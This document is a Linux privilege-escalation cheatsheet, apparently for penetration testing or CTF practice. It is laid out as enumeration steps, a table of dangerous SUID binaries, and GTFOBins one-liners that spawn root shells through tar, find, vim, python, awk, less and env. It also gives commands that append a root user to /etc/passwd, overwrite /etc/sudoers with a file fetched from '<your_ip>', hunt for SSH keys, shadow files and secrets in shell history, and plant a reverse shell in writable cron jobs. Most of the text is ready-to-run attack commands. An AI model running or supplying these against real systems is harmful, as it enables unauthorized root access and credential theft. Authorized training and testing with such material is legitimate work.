# Linux Privilege Escalation Cheatsheet

## Step 1 — Enumerate First

```bash
whoami
id
uname -a
cat /etc/os-release
```

---

## Step 2 — sudo -l (ALWAYS do this first)

```bash
sudo -l
```

If a binary appears under `(root)` — go straight to GTFOBins and run it with `sudo`.

---

## Step 3 — SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Red flags in SUID output (check these on GTFOBins)

| Binary                        | Why it's dangerous                      |
| ----------------------------- | --------------------------------------- |
| `/bin/bash`                   | Direct root shell                       |
| `/bin/sh`                     | Direct root shell                       |
| `/bin/tar`                    | Execute commands via checkpoint         |
| `/usr/bin/vim` / `vi`         | Shell escape                            |
| `/usr/bin/python` / `python3` | `os.system()` shell                     |
| `/usr/bin/perl`               | Shell via `-e`                          |
| `/usr/bin/ruby`               | Shell via `-e`                          |
| `/usr/bin/find`               | `-exec` shell                           |
| `/usr/bin/nmap`               | Interactive mode shell (older versions) |
| `/usr/bin/awk`                | Shell via `system()`                    |
| `/usr/bin/less` / `more`      | Shell escape via `!sh`                  |
| `/usr/bin/man`                | Shell escape via `!sh`                  |
| `/usr/bin/cp`                 | Overwrite `/etc/passwd`                 |
| `/usr/bin/mv`                 | Overwrite sensitive files               |
| `/usr/bin/wget`               | Overwrite files via download            |
| `/usr/bin/curl`               | Read files / overwrite                  |
| `/usr/bin/pkexec`             | CVE-2021-4034 (PwnKit)                  |
| `/usr/bin/sudo`               | Check sudo version for CVEs             |
| `/usr/bin/env`                | Execute arbitrary commands              |

**Normal/expected SUID binaries (usually safe to ignore):**
`mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `gpasswd`, `newgrp`, `ssh-keysign`

---

## Step 4 — GTFOBins Commands

### tar (SUID or sudo)
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# or
tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```

### find (SUID or sudo)
```bash
sudo find . -exec /bin/sh \; -quit
```

### vim (SUID or sudo)
```bash
sudo vim -c ':!/bin/sh'
```

### python (SUID or sudo)
```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

### awk (SUID or sudo)
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

### less / more (SUID or sudo)
```bash
sudo less /etc/passwd
# then type: !sh
```

### cp — overwrite /etc/passwd
```bash
# generate password hash
openssl passwd -1 -salt xyz password123
# add new root user line to /etc/passwd
echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### env (SUID or sudo)
```bash
sudo env /bin/sh
```

### curl / wget — overwrite files
```bash
# host a malicious file on your machine, then:
sudo wget http://<your_ip>/malicious -O /etc/sudoers
```

---

## Step 5 — Kernel / CVE Exploits

```bash
uname -r          # kernel version
pkexec --version  # if present, check for CVE-2021-4034 (PwnKit) — affects < 0.105-26ubuntu1.3
```

| CVE | Affects | What it does |
|---|---|---|
| CVE-2021-4034 | pkexec < patched | Local root via PwnKit |
| CVE-2021-3560 | polkit < 0.113 | Auth bypass → root |
| CVE-2019-14287 | sudo < 1.8.28 | `sudo -u#-1` → root |
| CVE-2019-18634 | sudo < 1.8.26 | Buffer overflow in pwfeedback |
| DirtyCow | kernel < 4.8.3 | Write to read-only memory |

---

## Step 6 — Writable Files & Cron Jobs

```bash
# world-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# if a cron script is writable — add reverse shell to it
```

---

## Step 7 — Passwords & Sensitive Files

```bash
cat /etc/passwd       # look for non-standard users with shell
cat /etc/shadow       # needs root, but check if readable
find / -name "*.txt" -readable 2>/dev/null
find / -name "id_rsa" -readable 2>/dev/null
history               # check bash history for passwords
env                   # environment variables may contain secrets
```

---

## Quick Reference — GTFOBins

Always check: https://gtfobins.github.io/
Search the binary name → filter by **SUID** or **Sudo**
